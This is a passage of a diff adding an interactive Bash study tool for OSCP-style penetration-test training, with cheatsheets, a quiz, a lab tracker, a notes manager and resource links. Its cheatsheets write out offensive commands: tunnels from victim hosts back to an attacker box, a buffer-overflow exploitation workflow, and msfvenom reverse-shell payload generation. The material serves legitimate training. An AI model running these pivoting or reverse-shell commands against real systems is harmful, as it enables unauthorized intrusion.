+${BBLUE}── WORDLIST GENERATION ───────────────────────────────────────${RESET}
+
+  ${CYAN}cewl${RESET} http://<target> -m 5 -w cewl.txt
+  ${CYAN}crunch${RESET} 8 10 abc123 -o custom.txt
+  ${CYAN}hashcat${RESET} --stdout -a 0 rockyou.txt -r best64.rule > mangled.txt
+
+${BBLUE}── KEY PATHS ──────────────────────────────────────────────────${RESET}
+
+  /usr/share/wordlists/rockyou.txt
+  /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt
+  /usr/share/seclists/Discovery/Web-Content/common.txt
+  /usr/share/seclists/Usernames/Names/names.txt
+"
+}
+
+cheatsheet_pivoting() {
+  show_content "Pivoting & Tunneling" "
+${BBLUE}── SSH TUNNELS ───────────────────────────────────────────────${RESET}
+
+  # Local forward (access internal:80 via localhost:8080)
+  ${CYAN}ssh${RESET} -L 8080:10.10.10.5:80 user@jump
+
+  # Remote forward (expose your local 4444 on jump)
+  ${CYAN}ssh${RESET} -R 4444:localhost:4444 user@jump
+
+  # SOCKS5 proxy
+  ${CYAN}ssh${RESET} -D 1080 user@jump
+  # Then: proxychains nmap -sT -Pn 10.10.10.0/24
+
+  # Edit /etc/proxychains4.conf:
+  socks5 127.0.0.1 1080
+
+${BBLUE}── CHISEL ────────────────────────────────────────────────────${RESET}
+
+  # Attacker (server mode)
+  ${CYAN}./chisel server${RESET} -p 8000 --reverse
+
+  # Victim (client mode)
+  ${CYAN}./chisel client${RESET} <attacker>:8000 R:socks
+  ${CYAN}./chisel client${RESET} <attacker>:8000 R:8080:10.10.10.5:80
+
+${BBLUE}── LIGOLO-NG ─────────────────────────────────────────────────${RESET}
+
+  # Attacker
+  ${CYAN}./proxy${RESET} -selfcert
+  # Victim
+  ${CYAN}./agent${RESET} -connect <attacker>:11601 -ignore-cert
+  # In proxy console: session → start → add route
+
+${BBLUE}── SOCAT ──────────────────────────────────────────────────────${RESET}
+
+  # Port forward on pivot host
+  ${CYAN}socat${RESET} TCP-LISTEN:8080,fork TCP:10.10.10.5:80
+
+${BBLUE}── PLINK (WINDOWS) ──────────────────────────────────────────${RESET}
+
+  ${CYAN}plink.exe${RESET} -D 1080 -ssh user@<attacker>
+  ${CYAN}plink.exe${RESET} -R 4444:127.0.0.1:4444 user@<attacker>
+
+${BBLUE}── DOUBLE PIVOT EXAMPLE ─────────────────────────────────────${RESET}
+
+  Attacker → Pivot1 → Pivot2 → Target
+  1. SSH -D 1080 user@Pivot1
+  2. proxychains ssh -D 1081 user@Pivot2
+  3. proxychains -q nmap -sT 10.10.20.x
+"
+}
+
+cheatsheet_bof() {
+  show_content "Buffer Overflow (x86)" "
+${BBLUE}── WORKFLOW ──────────────────────────────────────────────────${RESET}
+
+  1. ${BWHITE}Fuzz${RESET} – incrementing payload until crash
+       python3 -c \"print('A'*<n>)\" | nc <ip> <port>
+
+  2. ${BWHITE}Find offset${RESET}
+       msf-pattern_create -l <len>       → send pattern
+       msf-pattern_offset -l <len> -q <EIP>
+
+  3. ${BWHITE}Confirm EIP control${RESET}
+       \"A\"*offset + \"BBBB\" + \"C\"*(len-offset-4)
+
+  4. ${BWHITE}Bad characters${RESET} – send \\x01-\\xff (excluding known bads)
+       !mona bytearray -b \"\\x00\"
+       !mona compare -f bytearray.bin -a <ESP addr>
+
+  5. ${BWHITE}Find JMP ESP${RESET}
+       msf-msfrop -s \"JMP ESP\" /path/to/binary
+       !mona jmp -r esp -cpb \"\\x00<bads>\"
+       # Note address – LITTLE ENDIAN: \\xAA\\xBB\\xCC\\xDD
+
+  6. ${BWHITE}Shellcode${RESET}
+       msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 \\
+         -b \"\\x00<bads>\" -f python
+
+  7. ${BWHITE}Final exploit structure${RESET}
+       padding(offset) + JMP_ESP_LE + NOP*16 + shellcode
+
+${BBLUE}── IMMUNITY DEBUGGER / MONA ─────────────────────────────────${RESET}
+
+  !mona config -set workingfolder c:\\\\mona\\\\%p
+  !mona bytearray -b \"\\x00\"
+  !mona compare -f c:\\\\mona\\\\<app>\\\\bytearray.bin -a <ESP>
+  !mona jmp -r esp -cpb \"\\x00\"
+  !mona findmsp -distance 600
+
+${BBLUE}── MSFVENOM CHEAT ────────────────────────────────────────────${RESET}
+
+  # Windows
+  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -b \"\\x00\" -f python -v shellcode
+  # Linux
+  msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -b \"\\x00\" -f python -v shellcode
+"
+}
+
+cheatsheet_reporting() {
+  show_content "Report Writing Guide" "
+${BBLUE}── OSCP REPORT STRUCTURE ─────────────────────────────────────${RESET}
+
+  1. Title Page
+     – Your name · OSID · Date · Version
+
+  2. Table of Contents
+
+  3. Executive Summary
+     – Non-technical overview · machines compromised · severity
+
+  4. Methodology
+     – Recon → Scanning → Exploitation → Post-exploitation
+
+  5. Findings (per machine)
+     ╔═══════════════════════════════════════╗
+     ║  Machine: <name> (<ip>)               ║
+     ║  Difficulty: Easy / Medium / Hard     ║
+     ╠═══════════════════════════════════════╣
+     ║  Initial Foothold                     ║
+     ║    Vulnerability:                     ║
+     ║    Steps:                             ║
+     ║    Screenshot: shell + ifconfig/id    ║
+     ╠═══════════════════════════════════════╣
+     ║  Privilege Escalation                 ║
+     ║    Method:                            ║
+     ║    Steps:                             ║
+     ║    Screenshot: root/SYSTEM proof      ║
+     ╚═══════════════════════════════════════╝
+
+  6. Recommendations / Remediation
+
+${BBLUE}── REQUIRED SCREENSHOTS ─────────────────────────────────────${RESET}
+
+  Linux:   hostname && id && cat /root/proof.txt && ip a
+  Windows: hostname && whoami && type C:\\Users\\Administrator\\Desktop\\proof.txt && ipconfig
+
+${BBLUE}── PROOF FILE LOCATIONS ──────────────────────────────────────${RESET}
+
+  Linux:    /home/<user>/local.txt   and   /root/proof.txt
+  Windows:  C:\\Users\\<user>\\Desktop\\local.txt
+            C:\\Users\\Administrator\\Desktop\\proof.txt
+
+${BBLUE}── TIPS ──────────────────────────────────────────────────────${RESET}
+
+  ✓ Document EVERYTHING as you go, not after
+  ✓ Screenshot before AND after every step
+  ✓ Copy proof files to your attack box immediately
+  ✓ Timestamp your findings
+  ✓ Use CherryTree / Obsidian / Joplin for notes
+  ✓ Use Flameshot or Greenshot for screenshots
+  ✓ Ghostwriter for auto-reporting
+"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# QUIZ
+# ─────────────────────────────────────────────────────────────────────────────
+declare -A Q_TEXT Q_A Q_B Q_C Q_D Q_ANS Q_EXPLAIN
+Q_TEXT[1]="Which nmap flag performs a SYN (stealth) scan?"
+  Q_A[1]="-sS"   Q_B[1]="-sT"   Q_C[1]="-sU"   Q_D[1]="-sV"   Q_ANS[1]="1"
+  Q_EXPLAIN[1]="${CYAN}-sS${RESET} (SYN scan) sends a SYN, waits for SYN-ACK, then RST – never completes the 3-way handshake. Stealthier than -sT (full connect)."
+
+Q_TEXT[2]="Which tool is used to automate SQL injection attacks?"
+  Q_A[2]="hydra"   Q_B[2]="sqlmap"   Q_C[2]="nikto"   Q_D[2]="wfuzz"   Q_ANS[2]="2"
+  Q_EXPLAIN[2]="${CYAN}sqlmap${RESET} automates detection and exploitation of SQL injection vulnerabilities."
+
+Q_TEXT[3]="In OSCP buffer overflow, what is the purpose of a NOP sled?"
+  Q_A[3]="Pad payload to exact offset"
+  Q_B[3]="Identify bad characters"
+  Q_C[3]="Give shellcode a larger landing zone so slight address variance still works"
+  Q_D[3]="Force the EIP to point to ESP"
+  Q_ANS[3]="3"
+  Q_EXPLAIN[3]="A NOP (\\x90) sled precedes shellcode so the CPU slides through harmless no-ops into shellcode regardless of minor address offsets."
+
+Q_TEXT[4]="Which privilege allows a Windows user to impersonate tokens (Potato exploits)?"
+  Q_A[4]="SeDebugPrivilege"
+  Q_B[4]="SeBackupPrivilege"
+  Q_C[4]="SeImpersonatePrivilege"
+  Q_D[4]="SeLoadDriverPrivilege"
+  Q_ANS[4]="3"
+  Q_EXPLAIN[4]="${CYAN}SeImpersonatePrivilege${RESET} lets a process impersonate another user's token – exploited by JuicyPotato, PrintSpoofer, GodPotato etc."
+
+Q_TEXT[5]="What does LFI stand for in web security?"
+  Q_A[5]="Local File Injection"
+  Q_B[5]="Local File Inclusion"
+  Q_C[5]="Limited File Interface"
+  Q_D[5]="Linked File Indexing"
+  Q_ANS[5]="2"
+  Q_EXPLAIN[5]="${CYAN}Local File Inclusion${RESET} – the server is tricked into including files from the local filesystem via unsanitised path parameters (e.g. ?page=../../../etc/passwd)."
+
+Q_TEXT[6]="Which command finds SUID binaries on Linux?"
+  Q_A[6]="find / -perm -4000 -type f 2>/dev/null"
+  Q_B[6]="find / -perm +s -type f 2>/dev/null"
+  Q_C[6]="ls -la / | grep s"
+  Q_D[6]="getcap -r / 2>/dev/null"
+  Q_ANS[6]="1"
+  Q_EXPLAIN[6]="${CYAN}find / -perm -4000 -type f${RESET} finds files with the SUID bit set. The -4000 mask matches the setuid permission. (Option B is outdated BSD syntax.)"
+
+Q_TEXT[7]="What Kerberos attack requests service tickets using SPNs to crack offline?"
+  Q_A[7]="Pass-the-Hash"
+  Q_B[7]="AS-REP Roasting"
+  Q_C[7]="Kerberoasting"
+  Q_D[7]="Silver Ticket"
+  Q_ANS[7]="3"
+  Q_EXPLAIN[7]="${CYAN}Kerberoasting${RESET} – request TGS tickets for accounts with SPNs, extract the encrypted ticket (RC4/AES), then crack offline with hashcat (-m 13100)."
+
+Q_TEXT[8]="Which tool creates a fast TCP tunnel via a reverse SOCKS proxy?"
+  Q_A[8]="netcat"
+  Q_B[8]="chisel"
+  Q_C[8]="curl"
+  Q_D[8]="nmap"
+  Q_ANS[8]="2"
+  Q_EXPLAIN[8]="${CYAN}chisel${RESET} is a fast TCP/UDP tunnel over HTTP secured with SSH. Run the server on your attacker box and use 'R:socks' on the victim for a reverse SOCKS proxy."
+
+TOTAL_QUESTIONS=8
+
+run_quiz() {
+  local score=0
+  print_header "Quick Knowledge Quiz" "Test your ethical hacking knowledge"
+  center_text "${DIM}Press any key to begin…${RESET}"
+  read -rsn1
+
+  local q
+  for (( q=1; q<=TOTAL_QUESTIONS; q++ )); do
+    print_header "Quiz  (${q}/${TOTAL_QUESTIONS})" "${Q_TEXT[$q]}"
+    printf "\n"
+    center_text "  ${BWHITE}1)${RESET} ${Q_A[$q]}"
+    center_text "  ${BWHITE}2)${RESET} ${Q_B[$q]}"
+    center_text "  ${BWHITE}3)${RESET} ${Q_C[$q]}"
+    center_text "  ${BWHITE}4)${RESET} ${Q_D[$q]}"
+    printf "\n"
+    center_text "${DIM}Press 1-4 to answer · q to quit quiz${RESET}"
+    printf "\n"
+
+    local answered=false
+    while ! $answered; do
+      read_key
+      case "$KEY" in
+        q|Q|"ESC") return ;;
+        [1-4])
+          answered=true
+          if [[ "$KEY" == "${Q_ANS[$q]}" ]]; then
+            print_header "Quiz  (${q}/${TOTAL_QUESTIONS})" "${Q_TEXT[$q]}"
+            printf "\n"
+            center_text "${BGREEN}✓  Correct!${RESET}"
+            (( score++ )) || true
+          else
+            local correct_label_var="Q_${Q_ANS[$q]}"
+            print_header "Quiz  (${q}/${TOTAL_QUESTIONS})" "${Q_TEXT[$q]}"
+            printf "\n"
+            center_text "${BRED}✗  Incorrect${RESET}"
+          fi
+          printf "\n"
+          center_text "${BYELLOW}Explanation:${RESET}"
+          printf "\n"
+          center_text "${Q_EXPLAIN[$q]}"
+          printf "\n"
+          center_text "${DIM}Press any key to continue…${RESET}"
+          read -rsn1 ;;
+      esac
+    done
+  done
+
+  # Results
+  print_header "Quiz Complete!" "Results"
+  printf "\n"
+  local pct=$(( score * 100 / TOTAL_QUESTIONS ))
+  local grade
+  if   (( pct >= 90 )); then grade="${BGREEN}Expert${RESET}"
+  elif (( pct >= 70 )); then grade="${BCYAN}Proficient${RESET}"
+  elif (( pct >= 50 )); then grade="${BYELLOW}Developing${RESET}"
+  else                       grade="${BRED}Keep Studying${RESET}"
+  fi
+
+  center_text "Score: ${BWHITE}${score} / ${TOTAL_QUESTIONS}${RESET}   (${pct}%)"
+  printf "\n"
+  center_text "Grade: ${grade}"
+  printf "\n"
+  center_text "${DIM}Press any key to return to menu…${RESET}"
+  read -rsn1
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# LAB TRACKER
+# ─────────────────────────────────────────────────────────────────────────────
+lab_tracker_menu() {
+  while true; do
+    interactive_menu "Lab Machine Tracker" "Log machines you have compromised" \
+      "📋|View All Logs" \
+      "➕|Log a Pwned Machine" \
+      "📊|Stats" \
+      "🗑 |Clear All Records"
+    case "$MENU_RESULT" in
+      -1) return ;;
+      0)  # View logs
+        print_header "Lab Logs"
+        if [[ -s "$LAB_LOG" ]]; then
+          local -a lines
+          while IFS= read -r line; do lines+=("$line"); done < "$LAB_LOG"
+          pager "Lab Logs" "${lines[@]}"
+        else
+          print_header "Lab Logs"
+          center_text "${DIM}No labs logged yet.${RESET}"
+          sleep 1.5
+        fi ;;
+      1)  # Log machine
+        print_header "Log Pwned Machine"
+        printf "\n"
+        show_cursor
+        read -rp "  Target IP: " tgt_ip
+        read -rp "  OS (Linux/Windows): " tgt_os
+        read -rp "  Initial access method: " tgt_access
+        read -rp "  Privesc method: " tgt_privesc
+        read -rp "  Notes: " tgt_note
+        hide_cursor
+        local ts; ts=$(date '+%Y-%m-%d %H:%M')
+        printf "%s | %-15s | %-8s | %-30s | %-20s | %s\n" \
+          "$ts" "$tgt_ip" "$tgt_os" "$tgt_access" "$tgt_privesc" "$tgt_note" >> "$LAB_LOG"
+        inc_labs
+        print_header "Machine Logged"
+        center_text "${BGREEN}✓ ${tgt_ip} recorded!${RESET}"
+        sleep 1.5 ;;
+      2)  # Stats
+        local labs; labs=$(get_labs)
+        print_header "Lab Stats"
+        printf "\n"
+        center_text "${BWHITE}Total machines pwned: ${BGREEN}${labs}${RESET}"
+        printf "\n"
+        if [[ -s "$LAB_LOG" ]]; then
+          local lin win
+          lin=$(grep -ci "linux" "$LAB_LOG" 2>/dev/null || echo 0)
+          win=$(grep -ci "windows" "$LAB_LOG" 2>/dev/null || echo 0)
+          center_text "Linux:   ${BCYAN}${lin}${RESET}"
+          center_text "Windows: ${BCYAN}${win}${RESET}"
+        fi
+        printf "\n"
+        center_text "${DIM}Press any key…${RESET}"; read -rsn1 ;;
+      3)  # Clear
+        print_header "Clear Records"
+        printf "\n"
+        center_text "${BRED}This will delete all lab records!${RESET}"
+        printf "\n"
+        show_cursor
+        read -rp "  Type YES to confirm: " confirm
+        hide_cursor
+        if [[ "$confirm" == "YES" ]]; then
+          > "$LAB_LOG"
+          python3 -c "
+import json
+d = json.load(open('${PROGRESS_FILE}'))
+d['labs'] = 0
+json.dump(d, open('${PROGRESS_FILE}','w'), indent=2)
+" 2>/dev/null
+          center_text "${BYELLOW}Records cleared.${RESET}"
+          sleep 1
+        fi ;;
+    esac
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# NOTES
+# ─────────────────────────────────────────────────────────────────────────────
+notes_menu() {
+  while true; do
+    interactive_menu "Study Notes" "Manage your personal notes" \
+      "📝|New Note" \
+      "📂|List Notes" \
+      "🔍|View / Search Note" \
+      "🗑 |Delete a Note"
+    case "$MENU_RESULT" in
+      -1) return ;;
+      0)  # New note
+        print_header "New Note"
+        printf "\n"
+        show_cursor
+        read -rp "  Note title: " ntitle
+        [[ -z "$ntitle" ]] && continue
+        local fname; fname="${NOTES_DIR}/$(echo "$ntitle" | tr ' ' '_' | tr '[:upper:]' '[:lower:]').md"
+        cat > "$fname" <<EOF
+# ${ntitle}
+Date: $(date '+%Y-%m-%d %H:%M')
+Target:
+IP:
+
+---
+
+## Summary
+
+
+## Commands Used
+
+
+## Findings
+
+
+## Credentials Found
+
+
+## Next Steps
+
+EOF
+        local ed="${EDITOR:-nano}"
+        hide_cursor
+        "$ed" "$fname"
+        print_header "Note Saved"
+        center_text "${BGREEN}✓ Saved: $(basename "$fname")${RESET}"
+        sleep 1.2 ;;
+      1)  # List
+        print_header "Study Notes"
+        local notes=( "${NOTES_DIR}"/*.md )
+        if [[ -f "${notes[0]}" ]]; then
+          local -a items=()
+          for f in "${notes[@]}"; do
+            items+=("$(basename "$f")")
+          done
+          pager "Study Notes" "${items[@]}"
+        else
+          center_text "${DIM}No notes yet.${RESET}"
+          sleep 1.5
+        fi ;;
+      2)  # View
+        print_header "View Note"
+        show_cursor
+        read -rp "  Search term: " term
+        hide_cursor
+        [[ -z "$term" ]] && continue
+        local match; match=$(find "${NOTES_DIR}" -name "*${term}*" -type f | head -1)
+        if [[ -n "$match" ]]; then
+          local -a lns=()
+          while IFS= read -r line; do lns+=("$line"); done < "$match"
+          pager "$(basename "$match")" "${lns[@]}"
+        else
+          print_header "View Note"
+          center_text "${BRED}No note found matching: ${term}${RESET}"
+          sleep 1.5
+        fi ;;
+      3)  # Delete
+        print_header "Delete Note"
+        show_cursor
+        read -rp "  Search term: " term
+        hide_cursor
+        [[ -z "$term" ]] && continue
+        local match; match=$(find "${NOTES_DIR}" -name "*${term}*" -type f | head -1)
+        if [[ -n "$match" ]]; then
+          show_cursor
+          read -rp "  Delete $(basename "$match")? (yes/no): " conf
+          hide_cursor
+          [[ "$conf" == "yes" ]] && rm "$match" && \
+            center_text "${BGREEN}Deleted.${RESET}" && sleep 1
+        else
+          center_text "${BRED}No note found.${RESET}"; sleep 1.5
+        fi ;;
+    esac
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# RESOURCES
+# ─────────────────────────────────────────────────────────────────────────────
+show_resources() {
+  show_content "Resources & Training Platforms" "
+${BBLUE}── PRACTICE LABS ─────────────────────────────────────────────${RESET}
+
+  ${BCYAN}HackTheBox${RESET}         https://www.hackthebox.com       (CTF-style VMs)
+  ${BCYAN}TryHackMe${RESET}          https://tryhackme.com            (guided paths)
+  ${BCYAN}VulnHub${RESET}            https://www.vulnhub.com          (offline VMs)
+  ${BCYAN}PortSwigger Labs${RESET}   https://portswigger.net/web-security
+  ${BCYAN}PicoCTF${RESET}            https://picoctf.org              (beginner CTF)
+  ${BCYAN}DVWA${RESET}               Damn Vulnerable Web App (self-hosted)
+  ${BCYAN}OWASP WebGoat${RESET}      https://owasp.org/www-project-webgoat/
+
+${BBLUE}── REFERENCE SITES ──────────────────────────────────────────${RESET}
+
+  ${BCYAN}HackTricks${RESET}         https://book.hacktricks.xyz      (comprehensive)
+  ${BCYAN}GTFOBins${RESET}           https://gtfobins.github.io       (SUID/sudo)
+  ${BCYAN}LOLBAS${RESET}             https://lolbas-project.github.io (Windows LOLBins)
+  ${BCYAN}PayloadsAllTheThings${RESET} https://github.com/swisskyrepo/PayloadsAllTheThings
+  ${BCYAN}Exploit-DB${RESET}         https://www.exploit-db.com
+  ${BCYAN}NVD${RESET}                https://nvd.nist.gov
+  ${BCYAN}CXSecurity${RESET}         https://cxsecurity.com
+
+${BBLUE}── LEARNING & COURSES ───────────────────────────────────────${RESET}
+
+  ${BCYAN}TCM Security${RESET}       https://academy.tcm-sec.com      (Practical courses)
+  ${BCYAN}HTB Academy${RESET}        https://academy.hackthebox.com
+  ${BCYAN}TryHackMe Paths${RESET}    https://tryhackme.com/paths
+  ${BCYAN}OffSec PWK${RESET}         https://www.offensive-security.com/pwk-oscp/
+  ${BCYAN}SANS Courses${RESET}       https://www.sans.org
+
+${BBLUE}── YOUTUBE / BLOGS ─────────────────────────────────────────${RESET}
+
+  ${BCYAN}IppSec${RESET}             HTB machine walkthroughs (post-retirement)
+  ${BCYAN}0xdf${RESET}               https://0xdf.gitlab.io  (detailed writeups)
+  ${BCYAN}John Hammond${RESET}       CTF walkthroughs & malware analysis
+  ${BCYAN}LiveOverflow${RESET}       Low-level exploit dev deep dives
+  ${BCYAN}NahamSec${RESET}           Bug bounty & web app hacking
+
+${BBLUE}── CERTIFICATIONS PATH ──────────────────────────────────────${RESET}
+
+  Beginner  →  CompTIA Security+  →  CompTIA PenTest+
+  Mid       →  eJPT (eLearnSec)  →  CEH  →  OSCP
+  Advanced  →  OSEP  →  OSED  →  OSWE  →  CRTP  →  CRTE  →  OSED
+"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CHEATSHEET MENU
+# ─────────────────────────────────────────────────────────────────────────────
+cheatsheet_menu() {
+  local topics=(
+    "🔍|Reconnaissance"
+    "📡|Scanning & Enumeration"
+    "🌐|Web Attacks"
+    "🔌|Network Attacks (SMB/FTP/AD)"
+    "💥|Exploitation & Shells"
+    "🕵 |Post-Exploitation"
+    "🐧|Linux Privilege Escalation"
+    "🪟|Windows Privilege Escalation"
+    "🔑|Password Attacks"
+    "🔀|Pivoting & Tunneling"
+    "💾|Buffer Overflow"
+    "📄|Report Writing"
+  )
+  local fns=(
+    cheatsheet_recon cheatsheet_scanning cheatsheet_web cheatsheet_network
+    cheatsheet_exploitation cheatsheet_post cheatsheet_privesc_lin cheatsheet_privesc_win
+    cheatsheet_password cheatsheet_pivoting cheatsheet_bof cheatsheet_reporting
+  )
+
+  while true; do
+    interactive_menu "Cheatsheets" "Select a topic" "${topics[@]}"
+    [[ "$MENU_RESULT" -eq -1 ]] && return
+    "${fns[$MENU_RESULT]}"
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN MENU
+# ─────────────────────────────────────────────────────────────────────────────
+main_menu() {
+  tput smcup 2>/dev/null || true   # save terminal screen
+
+  while true; do
+    interactive_menu "" "" \
+      "📚|Cheatsheets" \
+      "📈|Training Progress" \
+      "🧪|Knowledge Quiz" \
+      "🖥 |Lab Machine Tracker" \
+      "📝|Study Notes" \
+      "🌐|Resources & Training Platforms" \
+      "❌|Exit"
+
+    case "$MENU_RESULT" in
+      0)  cheatsheet_menu ;;
+      1)  show_progress_screen ;;
+      2)  run_quiz ;;
+      3)  lab_tracker_menu ;;
+      4)  notes_menu ;;
+      5)  show_resources ;;
+      6|-1)
+        show_cursor
+        tput rmcup 2>/dev/null || true
+        echo ""
+        echo "  Stay curious. Stay ethical."
+        echo ""
+        exit 0 ;;
+    esac
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ENTRY
+# ─────────────────────────────────────────────────────────────────────────────
+main_menu
